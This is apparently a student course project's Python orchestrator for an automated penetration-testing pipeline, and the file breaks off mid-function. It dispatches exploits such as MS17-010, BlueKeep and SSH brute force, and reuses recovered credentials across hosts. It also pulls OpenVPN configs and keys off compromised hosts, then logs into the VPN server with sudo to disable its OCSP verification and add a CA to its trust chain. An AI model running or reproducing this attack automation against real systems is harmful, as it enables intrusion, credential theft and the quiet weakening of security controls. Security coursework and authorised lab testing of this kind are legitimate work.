#!/usr/bin/env python3
"""
autopwn.py - Master Orchestrator
RIS602 Final Project: Topology-Agnostic Automated Penetration Testing Pipeline

Usage:
    python3 autopwn.py --target 172.16.10.0/24
    python3 autopwn.py --auto
    python3 autopwn.py --target 172.16.10.0/24 --dry-run
    python3 autopwn.py --target 172.16.10.0/24 --resume
    python3 autopwn.py --target 172.16.10.0/24 --skip-ad --skip-postex
"""

import argparse
import importlib
import ipaddress
import json
import os
import re
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

# ---------------------------------------------------------------------------
# ANSI colour helpers — zero external dependencies
# ---------------------------------------------------------------------------
RESET  = "\033[0m"
BOLD   = "\033[1m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
GREY   = "\033[90m"

def _c(colour: str, text: str) -> str:
    return f"{colour}{text}{RESET}"

def banner_stage(n: int, name: str) -> None:
    bar = "─" * 60
    print(f"\n{CYAN}{bar}{RESET}")
    print(f"{BOLD}{CYAN}  Stage {n}: {name}{RESET}")
    print(f"{CYAN}{bar}{RESET}")

def ok(msg: str) -> None:
    print(f"  {GREEN}[+]{RESET} {msg}")

def warn(msg: str) -> None:
    print(f"  {YELLOW}[!]{RESET} {msg}")

def err(msg: str) -> None:
    print(f"  {RED}[-]{RESET} {msg}")

def info(msg: str) -> None:
    print(f"  {GREY}[*]{RESET} {msg}")

# ---------------------------------------------------------------------------
# Global flags (set from CLI args; modules may read DRY_RUN via import)
# ---------------------------------------------------------------------------
DRY_RUN: bool = False

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
BASE_DIR   = Path(__file__).parent
STATE_DIR  = BASE_DIR / "state"
OUTPUT_DIR = BASE_DIR / "output"

STATE_FILES = {
    "discovery":    STATE_DIR / "discovery.json",
    "services":     STATE_DIR / "services.json",
    "ad_findings":  STATE_DIR / "ad_findings.json",
    "attack_plan":  STATE_DIR / "attack_plan.json",
    "exploitation": STATE_DIR / "exploitation.json",
    "lateral":      STATE_DIR / "lateral.json",
    "postex":       STATE_DIR / "postex.json",
    "timeline":     STATE_DIR / "timeline.json",
    "report":       OUTPUT_DIR / "report_latest.html",
}

# ---------------------------------------------------------------------------
# Timeline
# ---------------------------------------------------------------------------
_timeline: list[dict] = []

def tlog(stage: str, event: str, status: str = "info") -> None:
    """Append a timestamped entry to the in-memory timeline."""
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "stage": stage,
        "event": event,
        "status": status,
    }
    _timeline.append(entry)
    _atomic_write(STATE_FILES["timeline"], {"events": _timeline})

# ---------------------------------------------------------------------------
# Atomic JSON write
# ---------------------------------------------------------------------------
def _atomic_write(path: Path, data: dict) -> None:
    """Write JSON to a .tmp file then rename atomically."""
    tmp = path.with_suffix(".tmp")
    tmp.write_text(json.dumps(data, indent=2))
    tmp.rename(path)

def _load_json(path: Path) -> dict | None:
    try:
        return json.loads(path.read_text())
    except Exception:
        return None

# ---------------------------------------------------------------------------
# Subnet auto-detection
# ---------------------------------------------------------------------------
def detect_local_cidr() -> str:
    """
    Determine the local subnet CIDR without hardcoding anything.

    Strategy (in order):
      1. Parse `ip route` for the default route's source interface/prefix.
      2. Enumerate socket-level interface addresses (netifaces if available,
         otherwise fall back to a connect-trick to get the outbound IP, then
         scan /proc/net/fib_trie for the prefix length).
    """
    # --- Strategy 1: parse `ip route show` -----------------------------------
    try:
        out = subprocess.check_output(
            ["ip", "route", "show"], text=True, timeout=5
        )
        for line in out.splitlines():
            # Lines like: "default via 10.0.2.1 dev eth0 src 10.0.2.15 metric 100"
            # Or subnet lines: "10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15"
            parts = line.split()
            if len(parts) >= 1 and "/" in parts[0] and parts[0] != "default":
                cidr = parts[0]
                info(f"Auto-detected subnet from ip route: {cidr}")
                return cidr
    except Exception:
        pass

    # --- Strategy 2: netifaces -----------------------------------------------
    try:
        import netifaces  # type: ignore
        gws = netifaces.gateways()
        default_iface = gws.get("default", {}).get(netifaces.AF_INET, [None, None])[1]
        if default_iface:
            addrs = netifaces.ifaddresses(default_iface).get(netifaces.AF_INET, [])
            if addrs:
                ip   = addrs[0]["addr"]
                mask = addrs[0]["netmask"]
                import ipaddress
                net  = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
                cidr = str(net)
                info(f"Auto-detected subnet via netifaces: {cidr}")
                return cidr
    except Exception:
        pass

    # --- Strategy 3: connect trick + /proc/net/fib_trie ----------------------
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]

        import ipaddress, struct

        # Walk /proc/net/fib_trie to find the prefix covering local_ip
        local_int = int(ipaddress.IPv4Address(local_ip))
        best_prefix = None
        best_len    = -1

        with open("/proc/net/fib_trie") as f:
            content = f.read()

        # Pairs: address lines followed by /prefix lines
        import re
        entries = re.findall(
            r"(\d+\.\d+\.\d+\.\d+)\n\s+/(\d+)", content
        )
        for addr_str, plen_str in entries:
            plen    = int(plen_str)
            net_int = int(ipaddress.IPv4Address(addr_str))
            mask    = (0xFFFFFFFF << (32 - plen)) & 0xFFFFFFFF
            if (local_int & mask) == net_int and plen > best_len and plen < 32:
                best_len    = plen
                best_prefix = f"{addr_str}/{plen}"

        if best_prefix:
            info(f"Auto-detected subnet from /proc/net/fib_trie: {best_prefix}")
            return best_prefix
    except Exception:
        pass

    sys.exit(
        err("Could not auto-detect local subnet. Use --target <CIDR> instead.")
        or 1
    )

# ---------------------------------------------------------------------------
# LHOST detection
# ---------------------------------------------------------------------------
def detect_lhost(target_cidr: str) -> str:
    """
    Find the local interface IP that would be used to reach the target network.
    Uses a non-blocking UDP connect trick — no packets are actually sent.
    """
    import ipaddress
    try:
        net        = ipaddress.IPv4Network(target_cidr, strict=False)
        # Pick the first usable host address in the target range as probe dest
        probe_dest = str(next(net.hosts()))
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((probe_dest, 80))
            return s.getsockname()[0]
    except Exception:
        # Last-resort: hostname resolution
        return socket.gethostbyname(socket.gethostname())

# ---------------------------------------------------------------------------
# Stage runner helpers
# ---------------------------------------------------------------------------
def _should_skip(key: str, resume: bool) -> bool:
    """Return True if the stage's state file already exists and --resume is set."""
    if resume and STATE_FILES[key].exists():
        warn(f"Checkpoint found for '{key}' — skipping (--resume).")
        return True
    return False

def _run_stage(
    label: str,
    state_key: str,
    fn,
    resume: bool,
    *,
    skip: bool = False,
) -> dict | None:
    """
    Execute a pipeline stage function, handle errors, log timeline.

    Returns the loaded state dict on success, None on skip or failure.
    """
    if skip:
        warn(f"Skipping {label} (--skip flag set).")
        tlog(label, f"Skipped by flag", "skip")
        return None

    if _should_skip(state_key, resume):
        tlog(label, "Skipped — checkpoint exists", "skip")
        return _load_json(STATE_FILES[state_key])

    banner_stage_num = {
        "discovery": 1, "enrichment": 2, "ad_enum": 3, "planner": 4,
        "exploitation": 5, "reuse": 6, "postex": 7, "report": 8,
    }.get(state_key, 0)

    banner_stage(banner_stage_num, label)
    tlog(label, "Stage started", "start")
    t0 = time.monotonic()

    try:
        fn()
        elapsed = time.monotonic() - t0
        ok(f"{label} completed in {elapsed:.1f}s")
        tlog(label, f"Stage completed in {elapsed:.1f}s", "success")
        return _load_json(STATE_FILES[state_key])
    except Exception as exc:
        elapsed = time.monotonic() - t0
        err(f"{label} failed after {elapsed:.1f}s: {exc}")
        tlog(label, f"Stage failed: {exc}", "error")
        return None

# ---------------------------------------------------------------------------
# Exploit dispatcher (Stage 5)
# ---------------------------------------------------------------------------
# Map attack path names to (module_path, function_name)
EXPLOIT_DISPATCH: dict[str, tuple[str, str]] = {
    # SMB exploits
    "ms17_010":        ("modules.exploits.smb",       "exploit_ms17_010"),
    "smb_null":        ("modules.exploits.smb",       "exploit_smb_null"),
    "smb_shares":      ("modules.exploits.smb",       "exploit_smb_shares"),
    # Web exploits
    "wordpress_creds": ("modules.exploits.web",       "exploit_wordpress"),
    "dvwa_sqli":       ("modules.exploits.web",       "exploit_dvwa"),
    # Database exploits
    "mysql_default":   ("modules.exploits.database",  "exploit_mysql"),
    "redis_unauth":    ("modules.exploits.database",  "exploit_redis"),
    # Remote access exploits
    "ssh_brute":       ("modules.exploits.ssh",       "exploit_ssh"),
    "winrm_creds":     ("modules.exploits.winrm",     "exploit_winrm"),
    # MSSQL
    "mssql_default":   ("modules.exploits.mssql",     "exploit_mssql"),
    # RDP (both credential and BlueKeep paths use the same entry point)
    "rdp_creds":       ("modules.exploits.rdp",       "exploit_rdp"),
    "rdp_bluekeep":    ("modules.exploits.rdp",       "exploit_rdp"),
    # NFS
    "nfs_unauth":      ("modules.exploits.nfs",       "exploit_nfs"),
    # Nextcloud
    "nextcloud_creds": ("modules.exploits.nextcloud", "exploit_nextcloud"),
    # REMOVED: "kerberoast" — runs inside ad_enum.py Stage 3, not a standalone exploit
    # REMOVED: "ftp_anon"   — detected by NSE enrichment, no exploit module exists
}

def run_exploits(attack_plan: dict, lhost: str, dry_run: bool) -> None:
    """
    Iterate the HIGH-confidence attack paths and dispatch to exploit modules.
    Aggregates results and writes state/exploitation.json atomically.
    Stops after first success per host.
    """
    paths = attack_plan.get("attack_paths", [])
    if not paths:
        warn("No HIGH-confidence attack paths in plan — nothing to exploit.")
        results: list[dict] = []
        _atomic_write(STATE_FILES["exploitation"], {"results": results})
        return

    results = []
    succeeded_hosts: set[str] = set()

    for path_entry in sorted(paths, key=lambda x: x.get("priority", 999)):
        host      = path_entry["host"]
        technique = path_entry["path"]

        if host in succeeded_hosts:
            info(f"Skipping {technique} on {host} — already pwned this host.")
            continue

        if dry_run:
            warn(f"[DRY-RUN] Would execute '{technique}' against {host}")
            tlog("exploitation", f"DRY-RUN: {technique} on {host}", "dry_run")
            results.append({
                "success": False,
                "host": host,
                "technique": technique,
                "evidence": "Dry-run — not executed",
                "credentials_recovered": [],
                "session_type": "none",
                "error": None,
            })
            continue

        if technique not in EXPLOIT_DISPATCH:
            warn(f"No dispatcher for technique '{technique}' — skipping.")
            continue

        mod_path, fn_name = EXPLOIT_DISPATCH[technique]

        try:
            mod = importlib.import_module(mod_path)
        except ModuleNotFoundError as exc:
            err(f"Cannot import {mod_path}: {exc}")
            results.append({
                "success": False, "host": host, "technique": technique,
                "evidence": None, "credentials_recovered": [],
                "session_type": "none", "error": str(exc),
            })
            continue

        fn = getattr(mod, fn_name, None)
        if fn is None:
            err(f"{fn_name} not found in {mod_path}")
            continue

        info(f"Running {technique} against {host} ...")
        tlog("exploitation", f"Executing {technique} on {host}", "attempt")

        try:
            # Build kwargs based on technique requirements
            if technique == "ms17_010":
                result = fn(host, lhost)
            elif technique == "winrm_creds":
                creds = _collect_credentials()
                result = fn(host, creds)
            elif technique in ("rdp_creds", "rdp_bluekeep"):
                creds = _collect_credentials()
                # exploit_rdp needs os_guess and nse_results for BlueKeep detection
                host_data = _find_host_data(host)
                result = fn(
                    host,
                    credentials=creds,
                    os_guess=host_data.get("os_guess", ""),
                    nse_results=host_data.get("nse_3389", {}),
                )
            elif technique == "smb_shares":
                creds = _collect_credentials()
                result = fn(host, credentials=creds)
            elif technique in ("wordpress_creds", "dvwa_sqli"):
                # Determine the best port from services data
                port = _get_web_port(host)
                result = fn(host, port=port)
            else:
                result = fn(host)
        except Exception as exc:
            err(f"{technique} on {host} raised: {exc}")
            result = {
                "success": False, "host": host, "technique": technique,
                "evidence": None, "credentials_recovered": [],
                "session_type": "none", "error": str(exc),
            }

        results.append(result)

        if result.get("success"):
            ok(f"  {technique} SUCCEEDED on {host}!")
            tlog("exploitation", f"{technique} succeeded on {host}", "success")
            succeeded_hosts.add(host)
        else:
            warn(f"  {technique} failed on {host}: {result.get('error', 'no details')}")
            tlog("exploitation", f"{technique} failed on {host}", "failure")

        # Write checkpoint after every attempt so a crash loses at most one result
        _atomic_write(STATE_FILES["exploitation"], {"results": results})

    ok(f"Exploitation complete: {len(succeeded_hosts)} host(s) compromised.")

def _collect_credentials() -> list[dict]:
    """Gather cracked/recovered credentials from prior state files."""
    creds: list[dict] = []
    for key in ("ad_findings", "exploitation"):
        data = _load_json(STATE_FILES[key])
        if not data:
            continue
        # ad_findings schema
        for c in data.get("cracked_credentials", []):
            creds.append(c)
        # exploitation schema
        for r in data.get("results", []):
            for c in r.get("credentials_recovered", []):
                creds.append(c)
    return creds

def _get_web_port(target_ip: str) -> int:
    """Return the best HTTP(S) port for a host — prefer 443 over 80."""
    data = _load_json(STATE_FILES["services"])
    if not data:
        return 80
    for h in data.get("hosts", []):
        if h.get("ip") == target_ip:
            open_ports = {p["port"] for p in h.get("ports", []) if p.get("state") == "open"}
            if 443 in open_ports:
                return 443
            if 80 in open_ports:
                return 80
    return 80


def _find_host_data(target_ip: str) -> dict:
    """Look up a host's os_guess and port 3389 NSE results from services.json."""
    data = _load_json(STATE_FILES["services"])
    if not data:
        return {}
    for h in data.get("hosts", []):
        if h.get("ip") == target_ip:
            nse_3389 = {}
            for p in h.get("ports", []):
                if p.get("port") == 3389:
                    nse_3389 = p.get("nse_results", {})
                    break
            return {"os_guess": h.get("os_guess", ""), "nse_3389": nse_3389}
    return {}

# ---------------------------------------------------------------------------
# Print banner
# ---------------------------------------------------------------------------
def print_banner(target: str) -> None:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lines = [
        "╔══════════════════════════════════════════════════════════════╗",
        "║         AutoPwn — Topology-Agnostic PenTest Pipeline        ║",
        "║              RIS602 Final Project  |  Seneca Poly           ║",
        "╚══════════════════════════════════════════════════════════════╝",
    ]
    for line in lines:
        print(_c(CYAN, line))
    print(f"  {BOLD}Target :{RESET} {WHITE}{target}{RESET}")
    print(f"  {BOLD}Started:{RESET} {WHITE}{ts}{RESET}")
    print(f"  {BOLD}Mode   :{RESET} {YELLOW}{'DRY-RUN' if DRY_RUN else 'LIVE'}{RESET}\n")

# ---------------------------------------------------------------------------
# CLI argument parsing
# ---------------------------------------------------------------------------
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="autopwn.py",
        description="Topology-agnostic automated penetration testing pipeline.",
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        "--target", metavar="CIDR",
        help="Target subnet in CIDR notation (e.g. 192.168.1.0/24)",
    )
    group.add_argument(
        "--auto", action="store_true",
        help="Auto-detect the local subnet and use it as the target",
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="Build the attack plan but do not execute any exploits",
    )
    parser.add_argument(
        "--resume", action="store_true",
        help="Skip stages whose state file already exists (resume after crash)",
    )
    parser.add_argument(
        "--skip-ad", action="store_true",
        help="Skip Stage 3: Active Directory enumeration",
    )
    parser.add_argument(
        "--skip-postex", action="store_true",
        help="Skip Stage 7: post-exploitation enumeration",
    )
    parser.add_argument(
        "--max-iterations", type=int, default=3, metavar="N",
        help="Maximum pivot iterations before stopping (default: 3)",
    )
    return parser.parse_args()

# ---------------------------------------------------------------------------
# Pivot helpers — extract new attack surface from post-ex output
# ---------------------------------------------------------------------------

def _extract_pivot_subnets(postex_data: dict, known_cidrs: set[str]) -> set[str]:
    """
    Parse post-exploitation command outputs for new subnets.

    Strategy (in priority order):
      1. Parse 'ip route' output for explicit CIDR routes (e.g. "172.16.12.0/27 via ...")
      2. Parse 'ip addr' output for interface CIDRs (e.g. "inet 172.16.12.1/27")
      3. Parse 'ipconfig' output for Windows subnet masks
      4. Fallback: derive /24 for any IP found in arp/route output

    Returns a set of CIDR strings.
    """
    new_cidrs: set[str] = set()
    # Regex for explicit CIDR notation in route/addr output
    cidr_pattern = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3}/\d{1,2})\b")
    ip_pattern = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b")

    # Networks to ignore: Docker bridges (172.17-19.x.x/16), VPN pools,
    # and any /32 peer addresses
    _IGNORE_PREFIXES = ("172.17.", "172.18.", "172.19.", "172.20.",
                        "10.8.", "10.9.")  # common OpenVPN pools

    def _should_ignore(net: ipaddress.IPv4Network) -> bool:
        """Filter out Docker bridges, VPN pools, and noise."""
        net_str = str(net.network_address)
        if any(net_str.startswith(p) for p in _IGNORE_PREFIXES):
            return True
        # /16 or larger subnets from post-ex are almost always Docker bridges
        if net.prefixlen <= 16:
            return True
        return False

    # Regex for netmask notation: "route 172.16.12.0 255.255.255.224" or
    # "Subnet Mask . . . : 255.255.255.224" paired with an IP on a nearby line
    netmask_route_re = re.compile(
        r"\b(\d{1,3}(?:\.\d{1,3}){3})\s+(255\.\d{1,3}\.\d{1,3}\.\d{1,3})\b"
    )

    # Collect IPs from tun/tap interfaces so we can exclude VPN pool subnets
    tun_ips: set[str] = set()
    # Match "inet <IP>" on any line that follows a tun interface header,
    # or on the same line as a tun reference (ip addr output)
    tun_ip_re = re.compile(
        r"inet\s+(\d{1,3}(?:\.\d{1,3}){3})(?:/\d+)?\s+.*?tun\d*"
        r"|tun\d*[^\n]*inet\s+(\d{1,3}(?:\.\d{1,3}){3})"
    )

    # Collect text from route/addr commands specifically, and all text for fallback
    route_text = ""
    all_text = ""
    for host_entry in postex_data.get("hosts", []):
        for cmd in host_entry.get("commands_run", []):
            output = cmd.get("output", "")
            all_text += output + "\n"
            command = cmd.get("command", "")
            if any(k in command for k in ("ip addr", "ip route", "ipconfig")):
                route_text += output + "\n"
                # Collect tun interface IPs (regex has two groups, one will be None)
                for m in tun_ip_re.finditer(output):
                    ip = m.group(1) or m.group(2)
                    if ip:
                        tun_ips.add(ip)

    # Build set of tun-associated CIDRs by checking if "tun" appears near the CIDR
    # in ip route output.  Match both formats:
    #   "172.16.12.48/28 dev tun0 proto kernel..."
    #   "172.16.12.0/27 via 172.16.12.50 dev tun0"
    tun_cidr_re = re.compile(r"(\d{1,3}(?:\.\d{1,3}){3}/\d{1,2})\b[^\n]*\bdev\s+tun\d*")
    tun_cidrs: set[str] = set()
    for m in tun_cidr_re.finditer(route_text):
        try:
            tun_cidrs.add(str(ipaddress.IPv4Network(m.group(1), strict=False)))
        except ValueError:
            pass
    # Also filter subnets that contain any tun interface IP
    for tun_ip in tun_ips:
        try:
            ip_obj = ipaddress.IPv4Address(tun_ip)
            # Check common VPN pool sizes: /28, /27, /24
            for prefix in (28, 27, 24):
                net = ipaddress.IPv4Network(f"{tun_ip}/{prefix}", strict=False)
                tun_cidrs.add(str(net))
        except ValueError:
            pass

    # Strategy 1+2: extract explicit CIDRs from route/addr output
    for match in cidr_pattern.finditer(route_text):
        cidr_str = match.group(1)
        try:
            net = ipaddress.IPv4Network(cidr_str, strict=False)
        except ValueError:
            continue
        if net.is_loopback or net.is_link_local or net.is_multicast:
            continue
        if net.prefixlen >= 32 or net.prefixlen < 8:
            continue
        if _should_ignore(net):
            continue
        normalized = str(net)
        # Skip VPN pool subnets (tun-associated routes like 172.16.12.48/28)
        if normalized in tun_cidrs:
            continue
        if normalized not in known_cidrs:
            new_cidrs.add(normalized)

    # Strategy 3: netmask notation (OpenVPN route push or Windows ipconfig)
    # e.g. "route 172.16.12.0 255.255.255.224" -> 172.16.12.0/27
    for match in netmask_route_re.finditer(route_text):
        ip_str, mask_str = match.group(1), match.group(2)
        try:
            net = ipaddress.IPv4Network(f"{ip_str}/{mask_str}", strict=False)
        except ValueError:
            continue
        if net.is_loopback or net.is_link_local or net.is_multicast:
            continue
        if net.prefixlen >= 32 or net.prefixlen < 8:
            continue
        if _should_ignore(net):
            continue
        normalized = str(net)
        if normalized not in known_cidrs:
            new_cidrs.add(normalized)

    # If we found explicit CIDRs or netmask routes, prefer those over /24 fallback
    if new_cidrs:
        return new_cidrs

    # Strategy 4: fallback — derive /24 for bare IPs (no CIDR in output)
    for match in ip_pattern.finditer(all_text):
        ip_str = match.group(1)
        try:
            ip = ipaddress.IPv4Address(ip_str)
        except ValueError:
            continue
        if ip.is_loopback or ip.is_link_local or ip.is_multicast or ip.packed[-1] == 255:
            continue
        # Skip IPs from tun interfaces (VPN pool addresses)
        if ip_str in tun_ips:
            continue
        net = ipaddress.IPv4Network(f"{ip_str}/24", strict=False)
        if _should_ignore(net):
            continue
        cidr_str = str(net)
        if cidr_str not in known_cidrs:
            new_cidrs.add(cidr_str)

    return new_cidrs


# ---------------------------------------------------------------------------
# VPN pivot — discover, download, and connect OpenVPN configs
# ---------------------------------------------------------------------------

_VPN_PROCESS: subprocess.Popen | None = None  # track the openvpn child process


def _find_ovpn_paths(postex_data: dict) -> list[tuple[str, str, str, str]]:
    """
    Scan post-ex output for .ovpn file paths on compromised hosts.
    Returns list of (host_ip, ovpn_remote_path, username, password).
    """
    results = []
    ovpn_re = re.compile(r"(/\S+\.ovpn)")

    # Build a map of host_ip -> (username, password) from exploitation state
    exploit_data = _load_json(STATE_FILES["exploitation"]) or {}
    host_creds: dict[str, tuple[str, str]] = {}
    for r in exploit_data.get("results", []):
        if r.get("success") and r.get("credentials_recovered"):
            cred = r["credentials_recovered"][0]
            host_creds[r["host"]] = (cred.get("username", ""), cred.get("password", ""))

    for host_entry in postex_data.get("hosts", []):
        ip = host_entry.get("ip", "")
        for cmd in host_entry.get("commands_run", []):
            output = cmd.get("output", "")
            for match in ovpn_re.finditer(output):
                ovpn_path = match.group(1)
                username, password = host_creds.get(ip, ("", ""))
                if username and password:
                    results.append((ip, ovpn_path, username, password))
                    info(f"Found .ovpn config on {ip}: {ovpn_path}")

    return results


def _download_ovpn_files(
    host: str, ovpn_path: str, username: str, password: str
) -> Path | None:
    """
    Download the .ovpn file and any referenced cert/key files from a
    compromised host via paramiko SFTP.  Returns the local .ovpn path
    or None on failure.
    """
    try:
        import paramiko
    except ImportError:
        err("paramiko not installed — cannot download VPN config")
        return None

    local_dir = STATE_DIR / "vpn_pivot"
    local_dir.mkdir(parents=True, exist_ok=True)

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            host, port=22, username=username, password=password,
            timeout=10, look_for_keys=False, allow_agent=False,
        )
        sftp = client.open_sftp()

        # Download the .ovpn file
        local_ovpn = local_dir / Path(ovpn_path).name
        info(f"Downloading {ovpn_path} from {host}...")
        sftp.get(ovpn_path, str(local_ovpn))

        # Parse the .ovpn for referenced cert/key/ca files and download them.
        # Skip any directive that uses inline blocks (<ca>...</ca> etc.)
        ovpn_content = local_ovpn.read_text(errors="replace")
        remote_dir = str(Path(ovpn_path).parent)
        modified = False

        for directive in ("ca", "cert", "key", "tls-auth", "tls-crypt"):
            # If the config has an inline block for this directive, skip it
            if re.search(rf"<{directive}>", ovpn_content):
                info(f"  {directive}: inline block detected — no download needed")
                continue
            pattern = re.compile(rf"^\s*{directive}\s+(\S+)", re.MULTILINE)
            m = pattern.search(ovpn_content)
            if not m:
                continue
            ref_file = m.group(1)
            # If relative path, resolve against the .ovpn's directory
            if not ref_file.startswith("/"):
                ref_file = f"{remote_dir}/{ref_file}"
            local_ref = local_dir / Path(ref_file).name
            try:
                info(f"Downloading referenced file: {ref_file}")
                sftp.get(ref_file, str(local_ref))
                # Rewrite the .ovpn to point at the local copy
                ovpn_content = ovpn_content.replace(
                    m.group(0).strip(),
                    f"{directive} {local_ref}",
                )
                modified = True
            except Exception as exc:
                warn(f"Could not download {ref_file}: {exc}")

        # Only rewrite if we changed external paths to local ones
        if modified:
            local_ovpn.write_text(ovpn_content)

        sftp.close()
        client.close()
        ok(f"VPN config downloaded to {local_ovpn}")
        return local_ovpn

    except Exception as exc:
        err(f"Failed to download VPN config from {host}: {exc}")
        return None


def _fix_ca_chain(
    ovpn_path: Path, host: str, username: str, password: str
) -> None:
    """
    Fix TLS issues that prevent a stolen .ovpn config from connecting.

    Three common issues with lab/internal VPN setups:

    1. Incomplete CA chain: the <ca> block only has the intermediate CA,
       but the server sends a full chain including the Root CA.
    2. OCSP verification script on the server side: `tls-verify` runs an
       OCSP check that may fail if the responder is down, causing the
       server to silently reject the client.
    3. Mismatched client-cert CA: the client cert was signed by a
       different CA (e.g. Easy-RSA `CN=vpn`) than the Neutron PKI chain
       the server trusts.  The old CA must be appended to the server's
       trust file.

    Fix: SSH into the VPN server and remediate all three issues.
    """
    try:
        import paramiko
    except ImportError:
        return

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            host, port=22, username=username, password=password,
            timeout=10, look_for_keys=False, allow_agent=False,
        )

        # --- Find the server config path ---
        find_conf_cmd = (
            "ls /etc/openvpn/server/server.conf /etc/openvpn/server.conf "
            "/etc/openvpn/*.conf 2>/dev/null | head -1"
        )
        _, stdout, _ = client.exec_command(find_conf_cmd, timeout=10)
        server_conf = stdout.read().decode(errors="replace").strip()
        if not server_conf:
            warn("Could not find OpenVPN server config")
            client.close()
            return

        # --- Read the full server config ---
        _, stdout, _ = client.exec_command(f"cat {server_conf}", timeout=10)
        server_config_text = stdout.read().decode(errors="replace")

        # --- Issue 1: Disable tls-verify (OCSP) if present ---
        if re.search(r"^\s*tls-verify\s+", server_config_text, re.MULTILINE):
            info("Server has tls-verify (OCSP) enabled — disabling it")
            cmd = f"sudo sed -i 's/^\\s*tls-verify/#tls-verify/' {server_conf}"
            _, stdout, stderr = client.exec_command(cmd, timeout=10)
            stdout.read()  # wait for completion
            server_changed = True
        else:
            server_changed = False

        # --- Issue 2: Extract CA file path from server config ---
        ca_match = re.search(r"^\s*ca\s+(\S+)", server_config_text, re.MULTILINE)
        ca_path = ca_match.group(1).strip('"').strip("'") if ca_match else None

        ca_content = ""
        if ca_path:
            _, stdout, _ = client.exec_command(f"cat {ca_path}", timeout=10)
            ca_content = stdout.read().decode(errors="replace").strip()
            if not ca_content or "BEGIN CERTIFICATE" not in ca_content:
                _, stdout, _ = client.exec_command(
                    f"sudo cat {ca_path} 2>/dev/null", timeout=10
                )
                ca_content = stdout.read().decode(errors="replace").strip()

        # --- Issue 3: Check if client cert was signed by a different CA ---
        # Find old/Easy-RSA CA certs on the server
        find_old_ca_cmd = (
            "sudo find /etc/openvpn /root /home -name 'ca.crt' -o -name 'ca.pem' "
            "2>/dev/null | head -5"
        )
        _, stdout, _ = client.exec_command(find_old_ca_cmd, timeout=10)
        old_ca_paths = stdout.read().decode(errors="replace").strip().splitlines()

        for old_ca_path in old_ca_paths:
            old_ca_path = old_ca_path.strip()
            if not old_ca_path or old_ca_path == ca_path:
                continue
            _, stdout, _ = client.exec_command(
                f"sudo cat {old_ca_path}", timeout=10
            )
            old_ca_content = stdout.read().decode(errors="replace").strip()
            if not old_ca_content or "BEGIN CERTIFICATE" not in old_ca_content:
                continue

            # Check if this old CA is already in the server's trust chain
            if ca_path:
                _, stdout, _ = client.exec_command(
                    f"sudo grep -c 'BEGIN CERTIFICATE' {ca_path}", timeout=10
                )
                existing = stdout.read().decode(errors="replace").strip()
                # Append the old CA to the server's trust chain
                info(f"Appending old CA ({old_ca_path}) to server trust chain")
                cmd = f"sudo bash -c 'cat {old_ca_path} >> {ca_path}'"
                _, stdout, stderr = client.exec_command(cmd, timeout=10)
                stdout.read()
                server_changed = True

        # --- Restart server if we changed anything ---
        if server_changed:
            info("Restarting OpenVPN server to apply changes...")
            # Try common service names
            for svc in ("openvpn-server@server", "openvpn@server", "openvpn"):
                _, stdout, stderr = client.exec_command(
                    f"sudo systemctl restart {svc} 2>/dev/null", timeout=15
                )
                stdout.read()
                err_out = stderr.read().decode(errors="replace").strip()
                if "not found" not in err_out and "failed" not in err_out.lower():
                    ok(f"OpenVPN server restarted ({svc})")
                    # Give the server a moment to initialize
                    time.sleep(3)
                    break

        # --- Fix client-side <ca> block ---
        if ca_content and "BEGIN CERTIFICATE" in ca_content:
            ovpn_text = ovpn_path.read_text(errors="replace")
            ca_block_re = re.compile(r"<ca>.*?</ca>", re.DOTALL)
            if ca_block_re.search(ovpn_text):
                new_ca_block = f"<ca>\n{ca_content}\n</ca>"
                ovpn_text = ca_block_re.sub(new_ca_block, ovpn_text)
                ovpn_path.write_text(ovpn_text)
                ok(f"Replaced <ca> block with server's full CA chain from {ca_path}")
            else:
                warn("No <ca> block found in .ovpn to replace")

        client.close()

    except Exception as exc:
        warn(f"Could not fix CA chain from VPN server: {exc}")


def _connect_vpn(ovpn_path: Path, timeout: int = 45) -> bool:
    """
    Start OpenVPN with the downloaded config.  Waits for a tun interface
    to appear (indicating the tunnel is up).  Returns True on success.
    """
    global _VPN_PROCESS

    if _VPN_PROCESS is not None and _VPN_PROCESS.poll() is None:
        warn("OpenVPN process already running — skipping reconnect")
        return True

    info(f"Starting OpenVPN with {ovpn_path}...")
    tlog("pivot", f"Connecting OpenVPN: {ovpn_path}", "attempt")

    # Check if the config or server pushes a default gateway redirect.
    # If so, use --pull-filter to ignore it — we only want the subnet
    # routes, not to replace Kali's default gateway (which would break
    # connectivity to DMZ hosts we already compromised).
    ovpn_text = ovpn_path.read_text(errors="replace")
    cmd = ["openvpn", "--config", str(ovpn_path)]
    if "redirect-gateway" in ovpn_text:
        info("Config contains redirect-gateway — adding --pull-filter to ignore it")
        cmd += ["--pull-filter", "ignore", "redirect-gateway"]
    # Always ignore pushed DNS to avoid breaking Kali's resolver
    cmd += ["--pull-filter", "ignore", "dhcp-option"]
    # Ignore pushed block-outside-dns (Windows-only, causes warnings on Linux)
    cmd += ["--pull-filter", "ignore", "block-outside-dns"]
    # Patch the config: comment out remote-cert-tls (EKU check that often
    # fails with internal CAs) and write a patched copy.
    # The <ca> block should already be fixed by _fix_ca_chain() — if not,
    # the handshake will still fail but we log the cause clearly.
    patched_ovpn = ovpn_path.parent / (ovpn_path.stem + "_patched.ovpn")
    patched_text = ovpn_text
